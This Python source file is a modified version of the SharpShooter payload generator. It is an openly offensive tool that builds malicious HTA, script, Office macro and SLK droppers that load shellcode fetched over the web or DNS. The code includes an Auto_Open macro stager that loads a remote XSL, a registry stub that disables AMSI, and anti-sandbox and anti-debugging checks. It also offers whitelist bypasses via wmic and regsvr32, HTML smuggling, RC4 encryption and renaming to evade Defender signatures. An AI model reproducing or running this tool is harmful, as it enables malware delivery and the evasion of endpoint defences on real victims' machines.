#! /usr/bin/env python3

# -*- coding: utf-8 -*-
#
# SharpShooter:
#   Payload Generation with CSharp and DotNetToJScript
#   2.0 Dominic Chell (@domchell), MDSec ActiveBreach (@mdseclabs)
#   3.0 WTF Ed SYANiDE 2021

from __future__ import print_function

import base64, gzip, random, string, sys, argparse, re
from jsmin import jsmin
from modules import *
from modules.defender import concat_rand
from io import BytesIO
from colorama import Fore

BRED = Fore.LIGHTRED_EX
BGREEN = Fore.LIGHTGREEN_EX
BBLUE = Fore.LIGHTBLUE_EX
BYELLOW = Fore.LIGHTYELLOW_EX
RESET = Fore.RESET

def print_bad(st,err=None,pre=""):
	print(f"%s{BRED}[*]{RESET} %s" % (pre,st))
	if not err == None:
		print(str(err))
	sys.exit(-1)

def print_warn(st):
	print(f"{BYELLOW}[!]{RESET} %s" % st)

def print_msg(st):
	print(f"{BBLUE}[*]{RESET} %s" % st)

def ret_good_arb(arb,st):
	return f"\n{BGREEN}%s{RESET} %s" % (arb,st)



class SuperSharpShooter:
	banner = f"""
             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\\\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     {BRED}SUPER{RESET}/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/

     {BGREEN}Dominic Chell, @domchell, MDSec ActiveBreach, v2.0{RESET}
     {BGREEN}SYANiDE, v3.0 Whiskey Tango Foxtrot edition{RESET}
"""

	def validate_args(x):
		print(x.banner)

		antisandbox = ret_good_arb("[1]","Key to Domain (e.g. 1=CONTOSO)")
		antisandbox += ret_good_arb("[2]","Ensure Domain Joined")
		antisandbox += ret_good_arb("[3]","Check for Sandbox Artifacts")
		antisandbox += ret_good_arb("[4]","Check for Bad MACs")
		antisandbox += ret_good_arb("[5]","Check for Debugging")

		parser = argparse.ArgumentParser(description="", formatter_class=argparse.RawTextHelpFormatter)
		parser.add_argument("--stageless", action='store_true', help="Create a stageless payload")
		parser.add_argument("--dotnetver", metavar="<ver>", dest="dotnetver", default=None, help="Target .NET Version: 2 or 4")
		parser.add_argument("--com", metavar="<com>", dest="comtechnique", default=None, help="COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote")
		parser.add_argument("--awl", metavar="<awl>", dest="awltechnique", default=None, help="Application Whitelist Bypass Technique: wmic, regsvr32")
		parser.add_argument("--awlurl", metavar="<awlurl>", dest="awlurl", default=None, help="URL to retrieve XSL/SCT payload")
		parser.add_argument("--payload", metavar="<format>", dest="payload", default=None, help="Payload type: hta, js, jse, vbe, vbs, wsf, macro, slk")
		parser.add_argument("--sandbox", metavar="<types>", dest="sandbox", default=None, help="Anti-sandbox techniques: " + antisandbox)
		parser.add_argument("--amsi", metavar="<amsi>", dest="amsi", default=None, help="Use amsi bypass technique: amsienable")
		parser.add_argument("--delivery", metavar="<type>", dest="delivery", default=None, help="Delivery method: web, dns, both")
		parser.add_argument("--rawscfile", metavar="<path>", dest="rawscfile", default=None, help="Path to raw shellcode file for stageless payloads")
		parser.add_argument("--shellcode", action='store_true', help="Use built in shellcode execution")
		parser.add_argument("--scfile", metavar="<path>", dest="shellcode_file", default=None, help="Path to shellcode file as CSharp byte array")
		parser.add_argument("--refs", metavar="<refs>", dest="refs", default=None, help="References required to compile custom CSharp,\ne.g. mscorlib.dll,System.Windows.Forms.dll")
		parser.add_argument("--namespace", metavar="<ns>", dest="namespace", default=None, help="Namespace for custom CSharp,\ne.g. Foo.bar")
		parser.add_argument("--entrypoint", metavar="<ep>", dest="entrypoint", default=None, help="Method to execute,\ne.g. Main")
		parser.add_argument("--web", metavar="<web>", dest="web", default=None, help="URI for web delivery")
		parser.add_argument("--dns", metavar="<dns>", dest="dns", default=None, help="Domain for DNS delivery")
		parser.add_argument("--output", metavar="<output>", dest="output", default=None, help="Name of output file (e.g. maldoc)")
		parser.add_argument("--smuggle", action='store_true', help="Smuggle file inside HTML")
		parser.add_argument("--template", metavar="<tpl>", dest="template", default=None, help="Name of template file (e.g. mcafee)")

		x.args = parser.parse_args()

		if not x.args.dotnetver and not x.args.payload=="slk":
			print_bad("Missing --dotnetver argument")
		else:
			if not x.args.payload=="slk":
				try:
					dotnetver = int(x.args.dotnetver)
					if not dotnetver in [2,4]:
						raise Exception("Only versions 2, 4 supported")
				except Exception as e:
					print_bad("Invalid .NET version",e)

		if not x.args.payload:
			print_bad("Missing --payload argument")
		if not x.args.delivery and not x.args.stageless and not x.args.payload=="slk":
			print_bad("Missing --delivery argument")
		if not x.args.output:
			print_bad("Missing --output argument")

		if(x.args.stageless) and (x.args.delivery or x.args.dns or x.args.web):
			print_bad("Stageless payloads are not compatible with delivery arguments")

		if(x.args.delivery == "both"):
			if(not x.args.web or not x.args.dns):
				print_bad("Missing --web and --dns arguments")
		elif(x.args.delivery == "web"):
			if not x.args.web:
				print_bad("Missing --web arguments")
		elif(x.args.delivery == "dns"):
			if not x.args.dns:
				print_bad("Missing --dns arguments")
		elif(x.args.delivery):
			print_bad("Invalid delivery method")


		if(not x.args.shellcode and not x.args.stageless and not x.args.payload=="slk"):
			if not x.args.refs or not x.args.namespace or not x.args.entrypoint:
				print_bad("Custom CSharp selected, --refs, --namespace and --entrypoint arguments required")
		else:
			if(not x.args.shellcode_file and not x.args.stageless and not x.args.payload=="slk"):
				print_bad("Built-in CSharp template selected, --scfile argument required")

		if(x.args.stageless and not x.args.rawscfile):
			print_bad("Stageless payloads require the --rawscfile argument")

		if(x.args.smuggle):
			if not x.args.template:
				print_bad("Template name required when smuggling")

		if(x.args.comtechnique):
			if not x.args.awlurl:
				print_bad(" --awlurl required when COM staging")

		if(x.args.payload == "macro" and x.args.smuggle):
			print_bad("Macro payload cannot be smuggled")

		if(x.args.payload == "macro" and not x.args.comtechnique=="xslremote"):
			print_bad("Macro payload requires the --com xsmlremote and --awlurl arguments")

		if(x.args.payload == "slk" and x.args.comtechnique):
			print_bad("SLK payloads do not currently support COM staging")

		if(x.args.payload == "slk"):
			print_bad("Shellcode must not contain null bytes")

		return x.args

	def read_file(x, f):
		with open(f, 'r') as fs:
			content = fs.read()
		return content

	def read_file_binary(x,f):
		with open(f, 'rb') as F:
			content = F.read()
		return content

	def rand_key(x, n):
		return ''.join([random.choice(string.ascii_lowercase) for i in range(n)])

	def gzip_str(x, string_):
		fgz = BytesIO()
		try:
			string_ = string_.encode()
		except:
			pass

		gzip_obj = gzip.GzipFile(mode='wb', fileobj=fgz)
		gzip_obj.write(string_)
		gzip_obj.close()
		return fgz

	def rc4(x, key, data):
		S = list(range(256))
		j = 0
		out = []

		for i in range(256):
			j = (j + S[i] + ord(key[i % len(key)])) % 256
			S[i], S[j] = S[j], S[i]

		i = j = 0
		for char in data:
			i = (i + 1) % 256
			j = (j + S[i]) % 256
			S[i], S[j] = S[j], S[i]
			out.append(ord(char) ^ S[(S[i] + S[j]) % 256])

		return bytes(bytearray(out))

	def fix_hardcode(x, base, method):
		# This will fix the Defender signature-based detection on the string "SharpShooter"
		notfunnystr = "SharpShooter"
		plain = base.replace(notfunnystr,concat_rand(notfunnystr,method))
		pat = re.compile(".*entry_class.*=.*")
		print_msg("Preview:  %s" % re.findall(pat,plain)[0])
		# print(plain)
		return plain

	def set_types(x,extT,codeT,fileT):
		x.template_body = x.read_file(x.template_base + extT)
		x.code_type = codeT
		x.file_type = fileT


	def run(x):
		x.template_body = ""
		x.template_base = "templates/sharpshooter."
		x.shellcode_delivery = False
		x.shellcode_gzip = ""
		x.payload_type = 0
		x.dotnet_version = 1
		x.stageless_payload = False
		x.PTYPES = {
			"hta":1,
			"js":2,
			"jse":3,
			"vba":4,
			"vbe":5,
			"vbs":6,
			"wsf":7,
			"macro":8,
			"slk":9
		}
		x.payload_type = x.PTYPES[x.args.payload] if x.args.payload in x.PTYPES.keys() else 0
		x.sandbox_techniques=""
		x.techniques_list = []
		x.sandboxevasion_type = 0

		x.macro_template = """	Set XML = CreateObject("Microsoft.XMLDOM")
	XML.async = False
	Set xsl = XML
	xsl.Load "%s"
	XML.transformNode xsl""" % (x.args.awlurl)

		x.macro_amsi_stub = """	regpath = "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable"
	Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
	e = 0
	On Error Resume Next
	r = oWSS.RegRead(regpath)
	If r <> 0 Then
		oWSS.RegWrite regpath, "0", "REG_DWORD"
		e = 1
	End If

	If Err.Number <> 0 Then
		oWSS.RegWrite regpath, "0", "REG_DWORD"
		e = 1
	Err.Clear
	End If

%s

	If e Then
		oWSS.RegWrite regpath, "1", "REG_DWORD"
	End If

	On Error GoTo 0""" % (x.macro_template)

		x.macro_stager = """Sub Auto_Open()
%MACRO_CODE%
End Sub"""

		if(x.args.amsi and x.args.payload=="macro"):
			x.macro_stager = x.macro_stager.replace("%MACRO_CODE%", x.macro_amsi_stub)
		else:
			x.macro_stager = x.macro_stager.replace("%MACRO_CODE%", x.macro_template)

		if not x.args.payload=="slk":
			x.dotnet_version = int(x.args.dotnetver)

			if((x.args.stageless or x.stageless_payload is True) and x.dotnet_version == 2):
				x.template_base = "templates/stageless."
			elif((x.args.stageless or x.stageless_payload is True) and x.dotnet_version == 4):
				x.template_base = "templates/stagelessv4."
			elif(x.dotnet_version == 4):
				x.template_base = "templates/sharpshooterv4."

		try:
			if x.payload_type < 1:
				raise Exception("Selected payload_type not one of avaialable types")

			## x.set_types(template_base ext, code_type, file_type)
			if(x.payload_type == 1):
				if(x.args.comtechnique):
					x.set_types("js","js","hta")
				else:
					x.set_types("vbs","vbs","hta")
			elif(x.payload_type == 2):
				x.set_types("js","js","js")
			elif(x.payload_type == 3):
				x.set_types("js","js","js")
			elif(x.payload_type == 4):
				print_warn("VBA support is still under development")
				raise Exception
                    #template_body = read_file(template_base + "vba")
                    #file_type = "vba"
			elif(x.payload_type == 5):
				if(x.args.comtechnique):
					x.set_types("js","js","vbs")
				else:
					x.set_types("vbs","vbs","vbs")
			elif(x.payload_type == 6):
				if(x.args.comtechnique):
					x.set_types("js","js","vbs")
				else:
					# x.set_types("vbs","js","vbs") ## Original; WTF?
					x.set_types("vbs","vbs","vbs")
			elif(x.payload_type == 7):
				x.set_types("js","js","wsf")
			elif(x.payload_type == 8):
				x.set_types("js","js","macro")
			elif(x.payload_type == 9):
				x.file_type = "slk"
		except Exception as e:
			print_bad("Incorrect choice", e, "\n")

		if(x.args.sandbox):
			x.techniques_list = x.args.sandbox.split(",")

		while True:
			if(x.techniques_list):
				x.sandboxevasion_type = x.techniques_list[0]
				x.techniques_list.remove(x.techniques_list[0])
				if not x.sandboxevasion_type:
					x.sandboxevasion_type = "0"
			else:
				x.sandboxevasion_type = "0"

			try:
				if("1" in x.sandboxevasion_type):
					x.domainkey = x.sandboxevasion_type.split("=")
					x.domain_name = x.domainkey[1]
					x.sandboxevasion_type = x.domainkey[0]

				x.sandboxevasion_type = int(x.sandboxevasion_type)
				if x.sandboxevasion_type > 5: raise Exception("Sandbox Evasion type not in range of acceptable options")

				if (x.sandboxevasion_type == 1):
					x.domain_name = x.domain_name.strip()

					if not x.domain_name: raise Exception("Missing domain_name")

					if len(x.domain_name) <= 1:
						raise Exception("domain_name length too short")
					else:
						print_msg("Adding keying for %s domain" % (x.domain_name))
						if("js" in x.file_type or x.args.comtechnique):
							x.sandbox_techniques += "\to.CheckPlease(0, \"%s\")\n" % x.domain_name
						else:
							x.sandbox_techniques += "o.CheckPlease 0, \"%s\"\n" % x.domain_name
						continue
				elif(x.sandboxevasion_type == 2):
					print_msg("Keying to domain joined systems")
					if("js" in x.file_type or x.args.comtechnique):
						x.sandbox_techniques += "\to.CheckPlease(1,\"foo\")\n"
					else:
						x.sandbox_techniques += "o.CheckPlease 1, \"foo\"\n"
					continue
				elif(x.sandboxevasion_type == 3):
					print_msg("Avoiding sandbox artifacts")

					if("js" in x.file_type or x.args.comtechnique):
						x.sandbox_techniques += "\to.CheckPlease(2,\"foo\")\n"
					else:
						x.sandbox_techniques += "o.CheckPlease 2,\"foo\"\n"
					continue
				elif(x.sandboxevasion_type == 4):
					print_msg("Avoiding bad MACs")

					if("js" in x.file_type or x.args.comtechnique):
						x.sandbox_techniques += "\to.CheckPlease(3,\"foo\")\n"
					else:
						x.sandbox_techniques += "o.CheckPlease 3,\"foo\"\n"
					continue
				elif(x.sandboxevasion_type == 5):
					print_msg("Avoiding debugging")

					if("js" in x.file_type or x.args.comtechnique):
						x.sandbox_techniques += "\to.CheckPlease(4,\"foo\")\n"
					else:
						x.sandbox_techniques += "o.CheckPlease 4,\"foo\"\n"
					continue
				elif(x.sandboxevasion_type == 0):
					break

			except Exception as e:
				print_bad("Incorrect choice",e,"\n")

		x.template_code = x.template_body.replace("%SANDBOX_ESCAPES%", x.sandbox_techniques)

		x.delivery_method = "1"
		x.encoded_sc = ""
		while True:

			if(x.args.delivery == "web"):
				x.delivery_method = "1"
			elif x.args.delivery == "dns":
				x.delivery_method = "2"
			else:
				x.delivery_method = "3"

			try:
				x.delivery_method = int(x.delivery_method)

				x.shellcode_payload = True if x.args.shellcode else False

				if (x.shellcode_payload):
					x.shellcode_delivery = True
					x.shellcode_template = x.read_file("templates/shellcode.cs")

					x.shellcode = []

					x.sc = x.read_file(x.args.shellcode_file)
					x.shellcode.append(x.sc)

					x.shellcode = "\n".join(x.shellcode)

					x.shellcode_final = x.shellcode_template.replace("%SHELLCODE%", x.shellcode)
					# print(x.shellcode_final)
					x.shellcode_gzip = x.gzip_str(x.shellcode_final)

				elif (x.args.stageless or x.stageless_payload is True):
					x.rawsc = x.read_file_binary(x.args.rawscfile)
					x.encoded_sc = base64.b64encode(x.rawsc)
					#if("vbs" in file_type or "hta" in file_type):
					#	sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
					#	for i in sc_split:
					#else:
					x.template_code = x.template_code.replace("%SHELLCODE64%", str(x.encoded_sc,'utf-8'))

				else:
					x.refs = x.args.refs
					x.namespace = x.args.namespace
					x.entrypoint = x.args.entrypoint

				if (x.shellcode_delivery):
					x.refs = "mscorlib.dll"
					x.namespace = "ShellcodeInjection.Program"
					x.entrypoint = "Main"

				if(x.delivery_method == 1 and not x.stageless_payload):
					## WEB
					x.stager = x.args.web

					if("js" in x.file_type or "wsf" in x.file_type or x.args.comtechnique):
						x.template_code = x.template_code.replace("%DELIVERY%", "o.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");" % (x.refs, x.namespace, x.entrypoint, x.stager))
					else:
						x.template_code = x.template_code.replace("%DELIVERY%", "o.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"" % (x.refs, x.namespace, x.entrypoint, x.stager))

				if(x.delivery_method == 2 and not x.stageless_payload):
					## DNS
					x.stager = x.args.dns

					if("js" in x.file_type or "wsf" in x.file_type or x.args.comtechnique):
						x.template_code = x.template_code.replace("%DELIVERY%", "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (x.refs, x.namespace, x.entrypoint, x.stager))
					else:
						x.template_code = x.template_code.replace("%DELIVERY%", "\to.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (x.refs, x.namespace, x.entrypoint, x.stager))

				if((x.delivery_method == 3) and (not x.args.stageless) and (not x.stageless_payload)):
					x.stager = x.args.web

					if("js" in x.file_type or "wsf" in x.file_type or x.args.comtechnique):
						x.webdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");\n" % (x.refs, x.namespace, x.entrypoint, x.stager)
					else:
						x.webdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"\n" % (x.refs, x.namespace, x.entrypoint, x.stager)

					x.stager = x.args.dns

					if("js" in x.file_type or "wsf" in x.file_type or x.args.comtechnique):
						x.dnsdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (x.refs, x.namespace, x.entrypoint, x.stager)
					else:
						x.dnsdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (x.refs, x.namespace, x.entrypoint, x.stager)

					x.deliverycode = x.webdelivery + x.dnsdelivery
					x.template_code = x.template_code.replace("%DELIVERY%", x.deliverycode)

				break
			except Exception as e:
				print_bad("Incorrect choice",e,"\n")

		x.amsi_bypass = ""
		x.outputfile = x.args.output
		x.outputfile_payload = x.outputfile + "." + x.file_type

		if x.args.amsi and not x.args.payload == "macro":
			if(x.args.comtechnique):
				x.amsi_bypass = amsikiller.amsi_stub("js", x.args.amsi, x.outputfile_payload)
				x.template_code = x.amsi_bypass + x.template_code + "}"
			else:
				x.amsi_bypass = amsikiller.amsi_stub(x.code_type, x.args.amsi, x.outputfile_payload)

				if x.file_type in ["vbs","vba","hta"]:
					x.template_code = x.amsi_bypass + x.template_code + "\nOn Error Goto 0\n"
				else:
					x.template_code = x.amsi_bypass + x.template_code + "}"

		#print(template_code)

		x.key = x.rand_key(32)
		x.template_code = x.fix_hardcode(x.template_code, x.code_type)
		x.payload_encrypted = x.rc4(x.key, x.template_code)
		x.payload_encoded = base64.b64encode(x.payload_encrypted)

		x.awl_payload_simple = ""

		if("js" in x.file_type or x.args.comtechnique):
			x.harness = x.read_file("templates/harness.js")
			x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
			x.payload = x.payload.replace("%KEY%", "'%s'" % (x.key))
			x.payload_minified = jsmin(x.payload)
			x.awl_payload_simple = x.template_code
		elif("wsf" in x.file_type):
			x.harness = x.read_file("templates/harness.wsf")
			x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
			x.payload = x.payload.replace("%KEY%", "'%s'" % (x.key))
			x.payload_minified = jsmin(x.payload)
		elif("hta" in x.file_type):
			x.harness = x.read_file("templates/harness.hta")
			x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
			x.payload = x.payload.replace("%KEY%", "'%s'" % (x.key))
			x.payload_minified = jsmin(x.payload)
		elif("vba" in x.file_type):
			x.harness = x.read_file("templates/harness.vba")
			x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
			x.payload = x.payload.replace("%KEY%", "\"%s\"" % (x.key))
			x.payload_minified = jsmin(x.payload)
		elif("slk" in x.file_type):
			pass
		else:
			x.harness = x.read_file("templates/harness.vbs")
			x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
			x.payload = x.payload.replace("%KEY%", "\"%s\"" % (x.key))
			# print(x.payload)

		if (x.payload_type == 3):
			x.file_type = "jse"
		elif (x.payload_type == 5):
			x.file_type = "vbe"

		f = open("output/" + x.outputfile_payload, 'wb')
		#print(payload)
		if(x.payload_type == 8):
			f.write(str(x.macro_stager),'utf-8')

		if(x.payload_type == 9):
			x.payload = excel4.generate_slk(x.args.rawscfile)

		if(x.args.comtechnique):
			if not x.args.awltechnique or x.args.awltechnique == "wmic":
				x.payload_file = "output/" + x.outputfile + ".xsl"
			else:
				x.payload_file = "output/" + x.outputfile + ".sct"

			#if("js" in file_type or "hta" in file_type or "wsf" in file_type):
			x.awl_payload = awl.create_com_stager(x.args.comtechnique, x.file_type, x.args.awlurl, x.payload_file, x.awl_payload_simple, x.args.amsi)
			#else:
			#	awl_payload = awl.create_com_stager(x.args.comtechnique, file_type, x.args.awlurl, payload_file, payload)
			f.write(x.awl_payload.encode('utf-8'))
		elif x.file_type in ["js","hta","wsf"]:
			f.write(x.payload_minified.encode('utf-8'))
		else:
			f.write(x.payload.encode('utf-8'))
		f.close()

		print_msg("Written delivery payload to output/%s" % x.outputfile_payload)
		if x.shellcode_delivery:
			x.outputfile_shellcode = x.outputfile + ".payload"
			with open("output/" + x.outputfile_shellcode, 'wb') as f:
				x.gzip_encoded = base64.b64encode(x.shellcode_gzip.getvalue())
				f.write(x.gzip_encoded)
				f.close()
				print_msg("Written shellcode payload to output/%s" % x.outputfile_shellcode)

		if not x.file_type in ["vba"]:
			if (x.args.smuggle):
				x.key = x.rand_key(32)
				x.template = ""
				x.template = x.args.template
				embedinhtml.run_embedInHtml(x.key, "./output/" + x.outputfile_payload, "./output/" + x.outputfile + ".html", x.template)
if __name__ == "__main__":
	ss = SuperSharpShooter()
	ss.validate_args()
	ss.run()
